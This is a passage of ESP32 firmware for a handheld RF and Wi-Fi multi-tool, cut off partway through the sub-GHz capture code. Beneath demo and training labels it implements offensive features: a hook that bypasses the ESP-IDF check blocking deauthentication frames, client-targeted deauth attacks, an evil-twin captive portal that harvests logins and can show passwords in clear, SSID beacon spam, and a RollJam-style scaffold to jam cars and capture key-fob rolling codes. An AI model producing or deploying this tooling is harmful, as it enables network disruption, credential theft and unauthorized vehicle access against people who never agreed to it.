#include <Arduino.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_err.h"
#include "driver/gpio.h"
#include "mbedtls/sha1.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include <Adafruit_PN532.h>

// PRD §9.5: F5 deauth injection. Arduino-ESP32/ESP-IDF rejects deauth and
// disassoc frames in esp_wifi_80211_tx() unless this raw-frame sanity hook is
// wrapped at link time; behavior follows the ESP32 Marauder-style lab pattern
// noted in the PRD, without copying Marauder source.
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}

// === DISPLAY ===
U8G2_SH1106_128X64_NONAME_F_HW_I2C display(U8G2_R0, U8X8_PIN_NONE);

// === PIN DEFINITIONS ===
#define PIN_CC_CS  15
// The second CC1101 is disabled in the main firmware for now: the spare radio
// is currently broken and the old GPIO2/GPIO12 wiring caused boot/flash trouble.
#define ENABLE_CC1101_JAMMER 0
#define PIN_CC2_CS  2
#define PIN_SD_CS   5
#define PIN_VSPI_SCK  18
#define PIN_VSPI_MISO 19
#define PIN_VSPI_MOSI 23
#define PIN_SD_SCK  27
#define PIN_SD_MISO 16
#define PIN_SD_MOSI 17
#define PIN_NFC_IRQ 13
#define PIN_NFC_RST_NONE -1

#define FW_VERSION "v0.5  SUBGHZ"
#define PORTAL_LOG_PATH "/captures/portal.log"
#define SG_CAPTURE_DIR "/captures/subghz"
#define NFC_CAPTURE_DIR "/captures/nfc"
#define IR_CAPTURE_DIR "/captures/ir"
#define WIFI_CAPTURE_DIR "/captures/wifi"
#define DEBUG_SERIAL 1
#define PORTAL_SHOW_CLEAR_PASSWORD 1  // Demo only. Set 0 before final report/demo handoff.

#if DEBUG_SERIAL
  #define DBG_PRINTF(...) Serial.printf(__VA_ARGS__)
  #define DBG_PRINTLN(x) Serial.println(x)
#else
  #define DBG_PRINTF(...)
  #define DBG_PRINTLN(x)
#endif

bool sdAvailable = false;
SPIClass sdSPI(HSPI);

void macToString(const uint8_t* mac, char* out, size_t outSize) {
  snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void logHeap(const char* tag) {
  DBG_PRINTF("[HEAP] %s free=%u min=%u max=%u\n",
             tag,
             ESP.getFreeHeap(),
             ESP.getMinFreeHeap(),
             ESP.getMaxAllocHeap());
}

// === BUTTONS ===
#define BTN_LEFT  14
#define BTN_UP    26
#define BTN_RIGHT 32
#define BTN_DOWN  33
#define DEBOUNCE_MS 50

struct BtnState { uint8_t pin; bool last; unsigned long t; };
BtnState btns[4] = {
  {BTN_UP,    true, 0},
  {BTN_DOWN,  true, 0},
  {BTN_RIGHT, true, 0},
  {BTN_LEFT,  true, 0},
};
const char btnKeys[4] = {'w', 's', 'e', 'q'};

void initButtons() {
  pinMode(BTN_UP,    INPUT_PULLUP);
  pinMode(BTN_DOWN,  INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_LEFT,  INPUT_PULLUP);
}

char readButtons() {
  unsigned long now = millis();
  for (int i = 0; i < 4; i++) {
    bool state = digitalRead(btns[i].pin);
    if (state != btns[i].last && (now - btns[i].t) > DEBOUNCE_MS) {
      btns[i].last = state;
      btns[i].t = now;
      if (state == LOW) {
        DBG_PRINTF("[BTN] key=%c pin=%u t=%lu\n", btnKeys[i], btns[i].pin, now);
        return btnKeys[i];
      }
    }
  }
  return 0;
}

// ============================================================
// MASCOT MOOD SYSTEM
// ============================================================

enum MoodType {
  MOOD_IDLE,
  MOOD_HAPPY,
  MOOD_THINKING,
  MOOD_SAD,
  MOOD_ANGRY,
  MOOD_SLEEPING,
  MOOD_SUCCESS,
  MOOD_FAIL,
  MOOD_WORKING,
  MOOD_WAVING   // animated wave — used during WiFi scan
};

bool reactionActive       = false;
unsigned long reactionStart = 0;
MoodType reactionMood     = MOOD_IDLE;
char reactionLine1[22]    = {0};
char reactionLine2[22]    = {0};
unsigned long lastInputTime = 0;
bool mascotVisualAllowed  = false;
#define REACTION_MS   2000
#define SLEEP_TIMEOUT 30000

void triggerReaction(MoodType mood, const char* l1, const char* l2 = nullptr) {
  reactionMood = mood;
  strncpy(reactionLine1, l1, 21);
  strncpy(reactionLine2, l2 ? l2 : "", 21);
  reactionActive  = true;
  reactionStart   = millis();
}

// Draw the robot-panda mascot at head-center (cx, cy)
void drawMascot(int cx, int cy, MoodType mood) {
  if (!mascotVisualAllowed) return;

  // Head
  display.drawDisc(cx, cy, 8);
  display.drawDisc(cx-6, cy-7, 3);
  display.drawDisc(cx+6, cy-7, 3);
  display.setDrawColor(0);
  display.drawBox(cx-5, cy-4, 10, 4);
  display.setDrawColor(1);

  // Eyes
  if (mood == MOOD_SLEEPING) {
    display.drawHLine(cx-4, cy-2, 3);
    display.drawHLine(cx+1, cy-2, 3);
  } else {
    display.drawDisc(cx-3, cy-2, 1);
    display.drawDisc(cx+3, cy-2, 1);
    if (mood == MOOD_ANGRY) {
      display.drawLine(cx-5, cy-4, cx-1, cy-3);
      display.drawLine(cx+5, cy-4, cx+1, cy-3);
    }
  }

  // Mouth
  switch (mood) {
    case MOOD_HAPPY: case MOOD_SUCCESS: case MOOD_WAVING:
      display.drawPixel(cx-3,cy+4); display.drawPixel(cx-2,cy+5);
      display.drawPixel(cx-1,cy+5); display.drawPixel(cx,cy+5);
      display.drawPixel(cx+1,cy+5); display.drawPixel(cx+2,cy+5);
      display.drawPixel(cx+3,cy+4); break;
    case MOOD_SAD: case MOOD_FAIL:
      display.drawPixel(cx-3,cy+5); display.drawPixel(cx-2,cy+4);
      display.drawPixel(cx-1,cy+4); display.drawPixel(cx,cy+4);
      display.drawPixel(cx+1,cy+4); display.drawPixel(cx+2,cy+4);
      display.drawPixel(cx+3,cy+5); break;
    case MOOD_THINKING: case MOOD_WORKING:
      display.drawFrame(cx-1, cy+4, 3, 3); break;
    case MOOD_ANGRY:
      display.drawHLine(cx-3,cy+5,6);
      display.drawHLine(cx-2,cy+4,4); break;
    case MOOD_SLEEPING:
      display.drawHLine(cx-2,cy+5,4); break;
    default:
      display.drawHLine(cx-3,cy+5,6);
  }

  // Body — bY declared ONCE here, before arms switch
  int bY = cy + 9;
  display.drawBox(cx-6, bY, 12, 9);
  display.setDrawColor(0);
  display.drawBox(cx-2, bY+2, 5, 4);
  display.setDrawColor(1);

  // Arms — MOOD_WAVING appears exactly ONCE
  switch (mood) {
    case MOOD_WAVING:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      if ((millis()/250)%2 == 0) {
        display.drawLine(cx+6, bY, cx+11, bY-6);
        display.drawDisc(cx+11, bY-8, 2);
      } else {
        display.drawLine(cx+6, bY+2, cx+10, bY-1);
        display.drawDisc(cx+10, bY-3, 2);
      }
      break;
    case MOOD_HAPPY:
      display.drawLine(cx-6, bY+2, cx-10, bY-3);
      display.drawLine(cx+6, bY+2, cx+10, bY-3); break;
    case MOOD_SUCCESS:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+2, cx+10, bY-3);
      display.drawDisc(cx+10, bY-5, 2); break;
    case MOOD_THINKING: case MOOD_WORKING:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+3, cx+4, bY+8);
      display.drawDisc(cx+3, bY+9, 2); break;
    case MOOD_SAD: case MOOD_FAIL:
      display.drawLine(cx-6, bY+4, cx-10, bY+9);
      display.drawLine(cx+6, bY+4, cx+10, bY+9); break;
    case MOOD_ANGRY:
      display.drawLine(cx-6, bY+2, cx-11, bY-3);
      display.drawDisc(cx-11, bY-5, 2);
      display.drawLine(cx+6, bY+2, cx+11, bY-3);
      display.drawDisc(cx+11, bY-5, 2); break;
    case MOOD_SLEEPING:
      display.drawLine(cx-6, bY+5, cx-9, bY+9);
      display.drawLine(cx+6, bY+5, cx+9, bY+9); break;
    default:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+3, cx+9, bY+7);
  }

  // Legs
  int lY = bY + 9;
  display.drawBox(cx-5, lY, 3, 5);
  display.drawBox(cx+2, lY, 3, 5);
  display.drawBox(cx-6, lY+3, 5, 3);
  display.drawBox(cx+1, lY+3, 5, 3);
}
  // --- Head (filled) ---
  
void drawReactionScreen() {
  display.clearBuffer();

  mascotVisualAllowed = true;
  drawMascot(22, 20, reactionMood);
  mascotVisualAllowed = false;

  display.drawVLine(46, 8, 48);

  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(50, 22, reactionLine1);
  if (strlen(reactionLine2) > 0) {
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(50, 35, reactionLine2);
  }

  // Mood extras
  switch (reactionMood) {
    case MOOD_SUCCESS:
    case MOOD_HAPPY:
      // confetti dots
      display.drawPixel(52, 5); display.drawPixel(60, 8);
      display.drawPixel(68, 4); display.drawPixel(76, 7);
      display.drawPixel(84, 3); display.drawPixel(56, 10);
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "!! NICE !!");
      break;
    case MOOD_FAIL:
    case MOOD_SAD:
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "try again...");
      break;
    case MOOD_THINKING:
    case MOOD_WORKING: {
      int dots = (millis() / 350) % 4;
      char d[5] = "    ";
      for (int i = 0; i < dots; i++) d[i] = '.';
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(50, 56, d);
      break;
    }
    case MOOD_SLEEPING:
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(10, 8, "z");
      display.drawStr(17, 5, "z");
      display.drawStr(24, 2, "Z");
      break;
    case MOOD_ANGRY:
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "ATTACKING!");
      break;
    default: break;
  }
  display.sendBuffer();
}

void drawBootAnimation() {
  mascotVisualAllowed = true;
  // Phase 1: character walks in from left
  for (int x = -15; x <= 22; x += 5) {
    display.clearBuffer();
    drawMascot(x, 28, MOOD_HAPPY);
    display.sendBuffer();
    delay(55);
  }
  // Phase 2: VARIONE text appears
  display.clearBuffer();
  drawMascot(22, 28, MOOD_HAPPY);
  display.setFont(u8g2_font_helvB12_tr);
  display.drawStr(46, 34, "VARIONE");
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(46, 48, FW_VERSION);
  display.sendBuffer();
  delay(600);
  // Phase 3: wave animation (3 times)
  for (int i = 0; i < 3; i++) {
    display.clearBuffer();
    drawMascot(22, 28, MOOD_HAPPY);
    display.setFont(u8g2_font_helvB12_tr);
    display.drawStr(46, 34, "VARIONE");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(46, 48, FW_VERSION);
    display.sendBuffer();
    delay(220);
    display.clearBuffer();
    drawMascot(22, 28, MOOD_IDLE);
    display.setFont(u8g2_font_helvB12_tr);
    display.drawStr(46, 34, "VARIONE");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(46, 48, FW_VERSION);
    display.sendBuffer();
    delay(220);
  }
  delay(200);
  mascotVisualAllowed = false;
}

// ============================================================
// PORTAL HTML
// ============================================================

const char ET_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VariPortal</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#eef1f4;color:#1d252c;font-size:14px}
.hdr{background:#24466b;color:#fff;padding:14px 16px}.hdr b{display:block;font-size:18px}.hdr span{font-size:12px;opacity:.86}
.nav{background:#fff;border-bottom:1px solid #c8ced6;padding:8px 14px;color:#4d5965;font-size:12px}
.wrap{display:flex;min-height:330px}.side{width:132px;min-width:132px;background:#f7f8fa;border-right:1px solid #c8ced6;padding:10px}
.panel{border:1px solid #aeb6bf;background:#fff}.pt{background:#dde3ea;padding:6px 8px;font-weight:bold;font-size:12px}
.pb{padding:8px}.pb label{display:block;font-size:11px;margin:7px 0 3px;color:#34404a}
input{width:100%;padding:6px;border:1px solid #98a2ad;border-radius:2px;font-size:13px}button{width:100%;margin-top:9px;background:#24466b;border:0;color:#fff;padding:7px;font-weight:bold}
.main{flex:1;background:#fff}.hero{height:118px;background:#d8dee6;display:flex;align-items:center;justify-content:center;color:#66717e}
.bar{background:#24466b;color:#fff;padding:7px 12px;font-size:13px}.content{padding:12px;color:#4d5965;line-height:1.4}
.notice{border-top:1px solid #d6dce3;margin-top:12px;padding-top:10px;font-size:11px;color:#66717e}
.ft{text-align:center;background:#f7f8fa;border-top:1px solid #d6dce3;padding:8px;color:#66717e;font-size:10px}
@media(max-width:520px){.wrap{display:block}.side{width:100%;border-right:0;border-bottom:1px solid #c8ced6}.hero{height:84px}}
</style></head><body>
<div class="hdr"><b>Network Access</b><span>Session validation required</span></div>
<div class="nav">Status &nbsp; Access &nbsp; Help</div>
<div class="wrap"><div class="side"><div class="panel"><div class="pt">Wi-Fi Access</div>
<div class="pb"><form action="/login" method="POST">
<label>Demo ID</label><input type="text" name="u" autocomplete="off" required>
<label>Demo Token</label><input type="password" name="p" autocomplete="off" required>
<button type="submit">Continue</button>
</form></div></div></div>
<div class="main"><div class="hero">Network session check</div><div class="bar">Connection Required</div>
<div class="content">Enter the lab-provided demo values to continue this cybersecurity awareness exercise.
<div class="notice">Training build: submissions are masked on-device and stored for demonstration review only.</div>
</div></div></div>
<div class="ft">VariOne education portal - bundled generic theme</div>
</body></html>
)rawliteral";

const char ET_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Training Demo</title>
<style>body{font-family:Arial;text-align:center;padding:60px 20px;background:#dde3ea}
.box{background:#fff;padding:30px 40px;border-radius:8px;display:inline-block;max-width:320px}
h2{color:#003366;margin-top:0}p{color:#555;font-size:14px}
.spinner{border:3px solid #eee;border-top:3px solid #003366;border-radius:50%;width:32px;height:32px;
animation:spin 1s linear infinite;margin:16px auto}
@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="box"><h2>&#10003; Demo Submitted</h2>
<div class="spinner"></div><p>This training portal recorded a masked test submission only.</p></div></body></html>
)rawliteral";

// ============================================================
// APP STATES
// ============================================================

enum AppState {
  STATE_MENU,
  STATE_WIFI_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_RESULTS,
  STATE_PACKET_MONITOR,
  STATE_PROBE_SNIFF,
  STATE_DEAUTH_DETECT,
  STATE_DEAUTH_TARGET,
  STATE_DEAUTH_CLIENT_SCAN,
  STATE_DEAUTH_CLIENT_SELECT,
  STATE_DEAUTH_CONFIRM,
  STATE_DEAUTH_ATTACK,
  STATE_BEACON_SPAM,
  STATE_ET_TARGET,
  STATE_ET_RUNNING,
  STATE_PORTAL_THEME,
  STATE_SUBGHZ,
  STATE_SUBGHZ_PICKER,
  STATE_SUBGHZ_FREQSCAN,
  STATE_SUBGHZ_ROLLJAM,
  STATE_NFC,
  STATE_NFC_MENU,
  STATE_NFC_ACCESS,
  STATE_NFC_SAVED,
  STATE_IR,
  STATE_ABOUT
};
AppState currentState = STATE_MENU;

// === MENU ===
const char* menuItems[] = {
  "Wi-Fi",
  "Sub-GHz",
  "NFC",
  "IR",
  "Mascot"
};
const int menuCount = 5;
int menuIndex = 0;

const char* wifiMenuItems[] = {
  "AP Scan",
  "Channel Graph",
  "Phone Probes",
  "Deauth Detector",
  "Deauth Attack",
  "SSID Spam",
  "VariPortal",
  "Portal Theme"
};
const int wifiMenuCount = 8;
int wifiMenuIndex = 0;
int wifiMenuScroll = 0;

// === WIFI DATA ===
struct WifiNetwork {
  String ssid;
  int rssi;
  int encryption;
  int channel;
  uint8_t bssid[6];
};
WifiNetwork wifiNets[20];
int wifiCount = 0;
int wifiScroll = 0;

// === PACKET MONITOR ===
volatile int channelPackets[15];
int channelPeaks[15];
int currentChannel = 1;
unsigned long lastChannelHop = 0;
unsigned long lastMonitorDraw = 0;
int totalPackets = 0;
bool monitorActive = false;

// === PROBE SNIFFER ===
struct ProbeRequest { char ssid[33]; int8_t rssi; uint8_t mac[6]; };
ProbeRequest probes[20];
int probeCount = 0;
int probeScroll = 0;
bool probeActive = false;

// === DEAUTH DETECTOR ===
volatile int deauthCount = 0;
volatile int totalMonitored = 0;
unsigned long deauthStart = 0;
bool deauthActive = false;
int deauthHistory[64];
int deauthHistIdx = 0;

// === DEAUTH DRILL ===
int deauthTargetIdx = 0, deauthTargetScroll = 0;
struct ClientMAC { uint8_t mac[6]; int8_t rssi; };
ClientMAC clients[16];
volatile int clientCount = 0;
int clientSelectIdx = 0, clientSelectScroll = 0;
bool clientScanActive = false;
volatile int deauthFrameCount = 0;
volatile int deauthTxOk = 0;
volatile int deauthTxFail = 0;
esp_err_t deauthLastTxErr = ESP_OK;
int deauthTxErrLogCount = 0;
volatile bool deauthAttackActive = false;
TaskHandle_t deauthTaskHandle = nullptr;
unsigned long lastDeauthSend = 0;
unsigned long deauthAttackStart = 0;
enum DeauthTargetMode {
  DEAUTH_MODE_BROADCAST,
  DEAUTH_MODE_ALL_DISCOVERED,
  DEAUTH_MODE_SINGLE
};
DeauthTargetMode attackMode = DEAUTH_MODE_BROADCAST;
uint8_t attackClientMAC[6];
int attackClientIdx = 0;
bool deauthReturnToPortal = false;
#define CLIENT_SCAN_MS 10000
#define DEAUTH_CONFIRM_HOLD_MS 1200
#define DEAUTH_ATTACK_MS 60000
#define DEAUTH_SEND_INTERVAL_MS 20
#define DEAUTH_FRAMES_PER_TICK 3
unsigned long clientScanStart = 0;
unsigned long deauthConfirmHoldStart = 0;

// === BEACON SPAM ===
const char* spamSSIDs[] = {
  "Lab Beacon 01", "Lab Beacon 02", "Lab Beacon 03",
  "Signal Demo A", "Signal Demo B", "Signal Demo C",
  "Training AP 01", "Training AP 02", "Training AP 03",
  "Awareness Lab", "Channel Test", "SSID Density",
  "VariOne Demo", "No Internet Demo", "Do Not Join Demo",
  "RF Classroom", "ESP32 Beacon", "SoftAP Sample",
  "Router Lab", "Spectrum Demo"
};
const int spamSSIDCount = 20;
bool beaconSpamActive = false;
int beaconFrameCount = 0, beaconSSIDIdx = 0, beaconChannelIdx = 0;
unsigned long lastBeaconSend = 0;
const uint8_t beaconChannels[] = {1, 6, 11};
uint8_t spamMACs[20][6];

// === PORTAL DEMO AP ===
DNSServer dnsServer;
WebServer webServer(80);
bool etActive = false;
int etTargetIdx = 0, etTargetScroll = 0;
int etCredCount = 0;
char etLastUser[33] = {0};
char etLastPass[33] = {0};
unsigned long lastEtDraw = 0;

struct PortalTheme {
  const char* name;
  const char* title;
  const char* subtitle;
  const char* accent;
  const char* panel;
  const char* userLabel;
  const char* passLabel;
  const char* button;
};

const PortalTheme portalThemes[] = {
  {"Network Access", "Network Access", "Session validation required", "#24466b", "Wi-Fi Access", "Demo ID", "Demo Token", "Continue"},
  {"Campus Lab", "Campus Lab Access", "Authorized training environment", "#2f5d50", "Lab Sign-In", "Lab ID", "Lab Passcode", "Join Lab"},
  {"Router Console", "Router Console", "Local gateway re-authentication", "#5b4a2f", "Gateway Login", "Admin Name", "Admin Key", "Apply"}
};
const int portalThemeCount = sizeof(portalThemes) / sizeof(portalThemes[0]);
const int maxSdPortalThemes = 5;
char sdPortalThemeNames[maxSdPortalThemes][24];
char sdPortalThemePaths[maxSdPortalThemes][64];
int sdPortalThemeCount = 0;
int portalThemeIdx = 0;
int portalThemeScroll = 0;

// === SUB-GHZ (CC1101) ===
RCSwitch rcSwitch = RCSwitch();
bool cc1101Ok    = false;
ELECHOUSE_CC1101 cc1101Jam;   // second CC1101 (jammer), CS=GPIO 2
bool cc1101JamOk = false;

struct SubGhzCapture {
  unsigned long value;
  unsigned int  bitLen;
  unsigned int  protocol;
  unsigned int  pulseLen;
  bool          valid;
};
SubGhzCapture sgCapture = {0, 0, 0, 0, false};

#define SG_WAVE_SAMPLES 512
uint8_t sgWave[SG_WAVE_SAMPLES];
uint16_t sgEdgesUs[SG_WAVE_SAMPLES];
uint16_t sgPrevEdgesUs[SG_WAVE_SAMPLES];
bool    sgWaveReady = false;
unsigned long sgLastReceived = 0;
bool    sgListening = false;
int     sgPulseCount = 0;
int     sgPrevPulseCount = 0;
uint8_t sgStartLevel = 1;
uint8_t sgPrevStartLevel = 1;
int     sgLastSimilarityPct = -1;
unsigned long sgLastAvgDeltaUs = 0;
bool    sgLastDynamicCandidate = false;
bool    sgLoadedFromSd = false;
bool    sgAwaitReplayResult = false;
char    sgTargetClass[28] = "unknown";
unsigned long sgPairId = 0;
uint8_t sgCaptureIndex = 0;
bool    sgNeedSecondCapture = false;
bool    sgArmed = false;
uint8_t sgArmLastGdo = 0;
unsigned long sgArmTime = 0;
int     sgBaselineRssi = -100;
int     sgNoiseFloor = -100;
int     sgCaptureRssi = -100;
#define SG_ARM_WINDOW 8000
#define SG_PICKER_MAX 12
char sgPickerPaths[SG_PICKER_MAX][96];
char sgPickerNames[SG_PICKER_MAX][40];
int  sgPickerCount = 0;
int  sgPickerIdx = 0;
int  sgPickerScroll = 0;
uint32_t sdNextSeq = 1;

// Frequency scanner (Flipper-inspired: scan common ISM bands to find active signal)
static const float SG_SCAN_FREQS[] = {300.00f, 303.875f, 315.00f, 330.00f, 345.00f, 390.00f, 433.92f, 868.35f, 915.00f};
static const int   SG_SCAN_NFREQS  = 9;
static const float SG_RX_BWS[] = {102.0f, 135.0f, 203.0f, 270.0f, 325.0f, 406.0f, 541.0f, 650.0f};
static const int   SG_RX_NBWS  = 8;
float sgActiveFreqMHz  = 433.92f;
int   sgActiveBwIdx     = 4;  // 325 kHz: proven-good OOK remote baseline from isolated CC1101 test.
int   sgFreqScanRssi[SG_SCAN_NFREQS]= {-100,-100,-100,-100,-100,-100,-100,-100,-100};
int   sgFreqScanEdges[SG_SCAN_NFREQS]= {0,0,0,0,0,0,0,0,0};
int   sgFreqScanIdx    = 6;  // default slot = 433.92
int   sgBwScanRssi[SG_RX_NBWS] = {-100,-100,-100,-100,-100,-100,-100,-100};
int   sgBwScanEdges[SG_RX_NBWS] = {0,0,0,0,0,0,0,0};

// Protocol decode (TE-based, Flipper-derived algorithms)
char  sgDecodedProtocol[24] = "unknown";
char  sgDecodedBits[64]     = "";

// RollJam (two-CC1101 attack — spare CC1101 on CS=GPIO2 jams car, primary captures fob)
// Ref: Samy Kamkar RollJam — behavior study only, independent implementation
// KeeLoq acceptance window: ~16 presses normal, ~1000 presses resync
enum RollJamPhase { RJ_IDLE, RJ_JAMMING_WAIT_P1, RJ_STOP_JAM_REPLAY_P1, RJ_WAIT_P2, RJ_COMPLETE };
RollJamPhase     sgRJPhase         = RJ_IDLE;
uint16_t         sgRJCode1[SG_WAVE_SAMPLES];
int              sgRJCode1Count    = 0;
uint8_t          sgRJCode1Start    = 1;   // start level of press-1 waveform
// MDMCFG4 register values for RX bandwidth switching
#define CC1101_MDMCFG4_NORMAL  0xCA   // default BW ~203kHz (ELECHOUSE Init default)
#define CC1101_MDMCFG4_NARROW  0x75   // narrow BW ~116kHz — rejects 433.80MHz jammer

// Multi-press rolling-code session (serial '4' starts 4-press capture)
#define SG_SESSION_MAX 4
uint8_t sgSessionTarget  = 0;   // 0 = no session, N = capture up to N presses
uint8_t sgSessionCount   = 0;   // presses captured so far in this session

void saveSubGhzCapture();
void saveSubGhzFlipperSub(uint32_t seq, unsigned long stamp, uint32_t freqHz);
const char* subGhzSecurityVerdict();
const char* subGhzCaptureQuality();
const char* subGhzComparisonVerdict();
void saveSubGhzReplayResult(const char* result, const char* observation);
void runRollingCodeSimulator();
void armSubGhzCapture(const char* label);
void enterSubGhzPicker();
void drawSubGhzPicker();
void drawSubGhzFreqScan();
bool loadLatestSubGhzCapture();
void replaySubGhzCapture();
void setSubGhzTargetClass(const char* targetClass);
void tryDecodeProtocol();
void runFreqScan();
void runBwTune();
void initCC1101Jammer();
void startJammer();
void stopJammer();
void startRollJam();
void drawSubGhzRollJam();
void saveNfcCapture();
void saveWifiScanCapture();
void saveWifiClientScanCapture();
void saveWifiDeauthSession();
void saveWifiPortalEvent(const char* user, const char* pass);
void loadSdPortalThemes();
const char* deauthModeName(DeauthTargetMode mode);
void startClientScan();
void startDeauthAttack();
void sha1Hex(const String& payload, char* out, size_t outSize);
void maskSecret(const char* in, char* out, size_t outSize);
void sanitizeLogField(const char* in, char* out, size_t outSize);
void configureSubGhzRawRx(float mhz, bool wideScan);

uint8_t cc1101ReadReg(uint8_t addr) {
  digitalWrite(PIN_CC_CS, LOW);
  delayMicroseconds(10);
  SPI.transfer(addr | 0x80);
  uint8_t val = SPI.transfer(0x00);
  digitalWrite(PIN_CC_CS, HIGH);
  return val;
}

void configureSubGhzRawRx(float mhz, bool wideScan) {
  ELECHOUSE_cc1101.setMHZ(mhz);
  ELECHOUSE_cc1101.setCCMode(0);       // async serial mode: raw OOK data on GDO0
  ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK
  ELECHOUSE_cc1101.setDRate(3.79372f); // proven remote baseline from isolated CC1101 test
  ELECHOUSE_cc1101.setDeviation(0.0f);
  ELECHOUSE_cc1101.setCrc(false);
  ELECHOUSE_cc1101.setSyncMode(0);
  ELECHOUSE_cc1101.setPA(10);
  ELECHOUSE_cc1101.setRxBW(wideScan ? 650.0f : SG_RX_BWS[sgActiveBwIdx]);
  pinMode(4, INPUT);
  ELECHOUSE_cc1101.SetRx();
  delay(wideScan ? 80 : 120);
}

static void compareSubGhzAligned(int& bestPct, unsigned long& bestAvgDelta, int& bestOffset, int& bestCompared) {
  bestPct = 0;
  bestAvgDelta = 0;
  bestOffset = 0;
  bestCompared = 0;

  for (int offset = -36; offset <= 36; offset++) {
    unsigned long totalDelta = 0;
    int closeEdges = 0;
    int compared = 0;

    for (int curr = 0; curr < sgPulseCount; curr++) {
      int prev = curr + offset;
      if (prev < 0 || prev >= sgPrevPulseCount) continue;

      unsigned int a = sgEdgesUs[curr];
      unsigned int b = sgPrevEdgesUs[prev];
      if (a < 80 || b < 80) continue;

      unsigned int delta = a > b ? a - b : b - a;
      totalDelta += delta;
      if (delta <= max(100U, (unsigned int)(b / 3))) closeEdges++;
      compared++;
    }

    if (compared < 24) continue;
    int pct = (closeEdges * 100) / compared;
    if (pct > bestPct || (pct == bestPct && compared > bestCompared)) {
      bestPct = pct;
      bestAvgDelta = totalDelta / compared;
      bestOffset = offset;
      bestCompared = compared;
    }
  }
}

void initCC1101() {
  SPI.begin(PIN_VSPI_SCK, PIN_VSPI_MISO, PIN_VSPI_MOSI, PIN_CC_CS);
  pinMode(PIN_CC_CS, OUTPUT);
  digitalWrite(PIN_CC_CS, HIGH);
  delay(100);

  // Raw SPI diagnostic — read PARTNUM(0xF0) and VERSION(0xF1)
  SPI.beginTransaction(SPISettings(4000000, MSBFIRST, SPI_MODE0));
  uint8_t partnum = cc1101ReadReg(0xF0);
  uint8_t version = cc1101ReadReg(0xF1);
  SPI.endTransaction();
  Serial.printf("[CC1101] RAW partnum=0x%02X version=0x%02X\n", partnum, version);
  // Expected: partnum=0x00 version=0x04 or 0x14
  // All 0xFF = MISO floating (loose wire)
  // All 0x00 = MOSI/SCK issue
  if (partnum != 0x00 || (version != 0x04 && version != 0x14)) {
    cc1101Ok = false;
    Serial.println("[CC1101] Not ready - skipping driver init");
    Serial.println("[CC1101] Check VCC=3V3, GND, CS=15, SCK=18, MISO=19, MOSI=23");
    Serial.println("[CC1101] If it works with SD unplugged, SD adapter is holding shared SPI MISO");
    return;
  }

  ELECHOUSE_cc1101.setSpiPin(PIN_VSPI_SCK, PIN_VSPI_MISO, PIN_VSPI_MOSI, PIN_CC_CS);
  ELECHOUSE_cc1101.setGDO0(4);
  delay(50);
  // Skip getCC1101() — raw SPI confirms chip present (partnum=0x00 version=0x14)
  ELECHOUSE_cc1101.Init();
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  cc1101Ok = true;
  Serial.println("[CC1101] OK");
}

void captureRawSignal() {
  sgCaptureRssi = ELECHOUSE_cc1101.getRssi();

  // Sample edge durations immediately after the arm trigger. Some CC1101
  // GDO0 configs pulse briefly or idle high, so waiting for a clean HIGH can
  // miss short fob bursts.
  uint8_t last = digitalRead(4);
  sgStartLevel = last ? 1 : 0;
  sgLoadedFromSd = false;
  unsigned long edgeStart = micros();
  sgPulseCount = 0;
  memset(sgWave, 0, sizeof(sgWave));
  memset(sgEdgesUs, 0, sizeof(sgEdgesUs));

  unsigned long captureStart = micros();
  unsigned long lastEdgeAt = captureStart;
  while (micros() - captureStart < 320000 && sgPulseCount < SG_WAVE_SAMPLES) {
    uint8_t now = digitalRead(4);
    if (now != last) {
      unsigned long dur = micros() - edgeStart;
      sgEdgesUs[sgPulseCount] = (uint16_t)min(dur, 65535UL);
      sgWave[sgPulseCount] = last;
      sgPulseCount++;
      last = now;
      edgeStart = micros();
      lastEdgeAt = edgeStart;
    } else if (sgPulseCount >= 24 && micros() - lastEdgeAt > 30000) {
      break;
    }
  }

  sgWaveReady    = true;
  sgLastReceived = millis();

  Serial.printf("[CC1101] capture edges=%d rssi=%ddBm floor=%ddBm\n",
                sgPulseCount, sgCaptureRssi, sgNoiseFloor);
  if (sgPulseCount > 0) {
    Serial.print("[CC1101] edges_us=");
    for (int i = 0; i < min(sgPulseCount, 24); i++) {
      if (i) Serial.print(',');
      Serial.print(sgEdgesUs[i]);
    }
    if (sgPulseCount > 24) Serial.print(",...");
    Serial.println();
  }

  if (sgPrevPulseCount > 0 && sgPulseCount > 0) {
    int bestOffset = 0;
    int compareCount = 0;
